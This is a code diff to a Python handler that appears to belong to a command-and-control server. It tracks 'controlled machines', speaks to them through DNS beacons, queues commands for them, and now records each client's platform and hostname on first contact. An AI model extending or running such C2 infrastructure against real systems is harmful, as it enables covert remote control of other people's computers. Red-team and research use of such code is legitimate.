@@ -1,5 +1,5 @@
 from socketserver import BaseRequestHandler
-from backend.handlers.dns import DNSHandler
+from backend.handlers.resolution import DNSHandler
 from datetime import datetime
 from util.structs import CommandType, Command
 from collections import deque
@@ -7,7 +7,7 @@ from typing import Union
 
 
 class ProvenanceClientHandler(BaseRequestHandler):
-    beacon_types = {
+    beacons = {
         "DNS": DNSHandler
     }
 
@@ -29,12 +29,13 @@ class ProvenanceClientHandler(BaseRequestHandler):
         self._sent_commands = []
         self._command_count = 0
         self._last_active: Union[datetime, None] = None
+        self._synchronized = False
 
         # The model that tracks each controlled machine
         # TODO: somehow dynamically assess the protocol (maybe set up multiple ports)
         self._protocol_handler = None
         if request or handler:
-            handler_type = self.beacon_types[handler]
+            handler_type = self.beacons[handler]
             # TODO: fix this jank
             self._protocol_handler = handler_type(
                 ip=client_address[0], socket=request[1] if request else None
@@ -52,7 +53,7 @@ class ProvenanceClientHandler(BaseRequestHandler):
         ip = data["ip"]
         commands = data["commands"]
 
-        beacon_handler = ProvenanceClientHandler.beacon_types[beacon]
+        beacon_handler = ProvenanceClientHandler.beacons[beacon]
         self._protocol_handler = beacon_handler(ip, None)
         self._os = os
         self._hostname = hostname
@@ -112,12 +113,18 @@ class ProvenanceClientHandler(BaseRequestHandler):
         """
         _, port = self.client_address
         self._last_active = datetime.now()
-        if self._queued_commands:
-            cmd_to_be_sent = self._queued_commands.popleft()
+        if not self._synchronized:
+            platform, hostname = self._protocol_handler.synchronize(self.request, port)
+            self._os = platform
+            self._hostname = hostname
+            self._synchronized = True
         else:
-            cmd_to_be_sent = Command(CommandType.NOP, "NONE")
-        self._protocol_handler.handle_request(self.request, port, cmd_to_be_sent)
-        self._sent_commands.append((self._command_count, cmd_to_be_sent))
+            if self._queued_commands:
+                next_cmd = self._queued_commands.popleft()
+            else:
+                next_cmd = Command(CommandType.NOP, "NONE")
+            self._protocol_handler.handle_request(self.request, port, next_cmd)
+            self._sent_commands.append((self._command_count, next_cmd))
 
     def queue_command(self, ctype, cmd):
         """
